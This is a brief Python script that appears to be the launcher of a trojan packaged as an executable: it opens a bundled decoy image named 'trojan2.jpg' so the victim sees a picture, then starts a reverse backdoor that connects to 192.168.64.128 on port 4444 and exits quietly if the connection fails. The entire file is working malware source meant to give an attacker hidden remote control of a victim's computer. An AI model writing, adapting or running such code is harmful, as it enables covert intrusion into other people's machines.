# C:\Users\IEUser\AppData\Local\Programs\Python\Python310\python.exe

import reverse_backdoor
import sys
import subprocess

file_name = sys._MEIPASS + "\\trojan2.jpg"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = reverse_backdoor.Backdoor("192.168.64.128", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()